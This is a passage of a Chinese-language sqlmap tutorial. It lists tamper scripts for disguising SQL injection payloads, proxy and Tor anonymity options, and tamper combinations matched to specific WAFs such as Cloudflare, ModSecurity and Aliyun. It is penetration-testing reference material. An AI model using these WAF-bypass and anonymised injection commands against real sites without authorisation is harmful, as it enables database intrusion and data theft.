<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">charunicodeencode.py</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">           # Unicode编码非编码字符</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                               # SELECT → %u0053%u0045%u004C%u0045%u0043%u0054</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 替换类</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">between.py</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                     # 大于号替换为NOT BETWEEN</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                               # '>' → 'NOT BETWEEN 0 AND #'</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">equaltolike.py</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                 # 等号替换为LIKE运算符</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                               # = → LIKE</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">greatest.py</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                    # 大于号替换为GREATEST</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                               # '>' → 'GREATEST'</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 空格处理</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">space2comment.py</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">               # 空格替换为注释符</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                               # ' ' → '/**/'</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">space2plus.py</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                  # 空格替换为加号</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                               # ' ' → '+'</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">space2randomblank.py</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">           # 空格替换为随机空白字符</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                               # ' ' → %09, %0A, %0C, %0D, %0B等</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">space2hash.py</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                  # 空格替换为#号和随机字符串</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                               # ' ' → '%23randomstr%0A'</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">space2morehash.py</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">              # 空格替换为#号和更多随机字符</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">space2mssqlblank.py</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">            # 空格替换为MSSQL有效空白字符</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">space2mssqlhash.py</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">             # 空格替换为#号(MSSQL)</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">space2mysqlblank.py</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">            # 空格替换为MySQL有效空白字符</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">space2mysqldash.py</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">             # 空格替换为--号和换行符</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 关键字处理</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">randomcase.py</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                  # 随机大小写</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                               # SELECT → SeLeCt</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">randomcomments.py</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">              # 随机位置插入注释</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                               # SELECT → S/**/E/**/LECT</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">versionedkeywords.py</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">           # 关键字添加MySQL版本注释</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                               # UNION → /*!12345UNION*/</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">halfversionedmorekeywords.py</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">   # 部分关键字添加版本注释</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">varnish.py</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                     # 添加HTTP头X-Forwarded-For</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># UNION处理</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">unionalltounion.py</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">             # UNION ALL SELECT替换为UNION SELECT</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">unionselect.py</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                 # UNION SELECT替换为U/**/NION/**/SELECT</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 特定WAF绕过</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">modsecurityversioned.py</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # 绕过ModSecurity</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">modsecurityzeroversioned.py</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 使用/*!00000*/绕过</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">securesphere.py</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                # 绕过SecureSphere WAF</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">versionedmorekeywords.py</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">       # 使用MySQL版本注释</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 其他</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">percentage.py</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                  # 在每个字符前添加%号</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">multiplespaces.py</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">              # 单个空格替换为多个空格</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">overlongutf8.py</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                # 转换为overlong UTF-8编码</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">overlongutf8more.py</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">            # 更多overlong UTF-8编码</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">unmagicquotes.py</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">               # 绕过magic_quotes（宽字节注入）</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                               # ' → %bf%27</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">appendnullbyte.py</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">              # 在payload末尾添加%00</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">chardoubleencode.py</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">            # 双重URL编码</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">commalesslimit.py</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">              # 绕过LIMIT N,M限制</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">commalessmid.py</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                # 绕过MID(column,start,length)限制</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">concat2concatws.py</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">             # CONCAT()替换为CONCAT_WS()</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">hex2char.py</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                    # 十六进制转字符</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">htmlencode.py</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                  # HTML编码所有非字母数字字符</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">ifnull2casewhenisnull.py</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">       # IFNULL(A, B)替换为CASE WHEN ISNULL(A)</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">ifnull2ifisnull.py</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">             # IFNULL(A,B)替换为IF(ISNULL(A),B,A)</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">luanginx.py</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                    # 绕过LUA-Nginx WAF</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">lowercase.py</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                   # 全部转换为小写</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">misunion.py</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                    # UNION替换为-1'||'0-（针对Microsoft SQL）</span></span></code></pre></figure>
<h3 id="83-匿名与代理">8.3 匿名与代理<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#83-匿名与代理" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 代理设置</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--proxy</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">PROXY</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                  # 使用代理服务器</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                               # 示例: --proxy=&quot;http://127.0.0.1:8080&quot;</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                               # 示例: --proxy=&quot;socks5://127.0.0.1:1080&quot;</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--proxy-cred</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">PROXY</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">             # 代理认证凭据 user:pass</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--proxy-file</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">PRO</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">               # 从文件加载代理列表（随机使用）</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Tor网络</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--tor</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                          # 使用Tor匿名网络</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--tor-port</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">TORPORT</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">             # Tor代理端口（默认9050）</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--tor-type</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">TORTYPE</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">             # Tor代理类型（HTTP, SOCKS4, SOCKS5）</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--check-tor</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                    # 检查Tor是否正确配置</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 请求控制</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--delay</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">DELAY</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                  # 每个HTTP请求之间的延时（秒）</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                               # 示例: --delay=2 （每次请求间隔2秒）</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--timeout</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">TIMEOUT</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">              # 连接超时秒数（默认30）</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--retries</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">RETRIES</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">              # HTTP请求重试次数（默认3）</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--randomize</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">RPARAM</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">             # 随机改变指定参数值</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                               # 示例: --randomize=id</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 安全URL</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--safe-url</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">SAFEURL</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">             # 测试时频繁访问的安全URL</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--safe-post</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">SAFE</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">               # 发送到安全URL的POST数据</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--safe-req</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">SAFER</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">               # 从文件加载安全HTTP请求</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--safe-freq</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">SAFE</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">               # 每访问X次目标后访问一次安全URL</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 示例：每5次请求访问一次安全页面</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--safe-url</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;http://example.com/safe.php&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> --safe-freq</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">5</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 其他规避选项</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--skip-urlencode</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">               # 跳过payload的URL编码</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--csrf-token</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">CSR</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">               # 参数用于存放CSRF token</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--csrf-url</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">CSRFURL</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">             # 提取CSRF token的URL</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--csrf-method</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">METHOD</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">           # 访问CSRF token URL的方法</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--force-ssl</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                    # 强制使用SSL/HTTPS</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--chunked</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                      # 使用HTTP分块传输编码</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--hpp</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                          # 使用HTTP参数污染</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                               # 示例: id=1&amp;id=[PAYLOAD]</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--eval</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">EVALCODE</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                # 在请求前执行Python代码</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                               # 示例: --eval=&quot;import hashlib;hash=hashlib.md5(id).hexdigest()&quot;</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 完整规避组合示例</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--proxy</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;http://127.0.0.1:8080&quot;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> --random-agent</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --delay=3</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --tamper=space2comment,randomcase</span></span></code></pre></figure>
<h3 id="84-waf识别与绕过流程">8.4 WAF识别与绕过流程<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#84-waf识别与绕过流程" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 1. 识别WAF</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;url&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --identify-waf</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 2. 根据WAF选择Tamper</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Cloudflare</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--tamper</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">space2comment</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># ModSecurity</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--tamper</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">modsecurityversioned,space2comment</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 安全狗</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--tamper</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">space2comment,between,randomcase</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 阿里云盾</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--tamper</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">space2morehash,between</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 3. 完整绕过测试</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sqlmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;url&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --random-agent</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --tamper=space2comment,between</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --delay=2</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --risk=2</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --level=3</span></span></code></pre></figure>
<h2 id="九输出与报告">九、输出与报告<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#九输出与报告" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
<h3 id="91-输出控制">9.1 输出控制<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#91-输出控制" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">-v</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> VERBOSE</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                     # 详细级别(0-6)</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">  0:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 只显示Python错误和严重信息</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">  1:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 显示基本信息和警告（默认）</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">  2:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 显示调试信息</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">  3:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 显示注入的payload</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">  4:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 显示HTTP请求</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">  5:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 显示HTTP响应头</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">  6:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 显示HTTP响应体</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 示例</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">-v</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 3</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                           # 查看具体的注入payload</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">-v</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 4</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                           # 调试HTTP请求问题</span></span></code></pre></figure>
<h3 id="92-输出格式">9.2 输出格式<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#92-输出格式" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">--batch</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                        # 批处理模式（不需要用户交互）</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--binary-fields</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">B</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">              # 包含二进制数据的字段（逗号分隔）</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--charset</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">CHARSET</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">              # 强制字符编码（如GBK, UTF-8）</span></span>
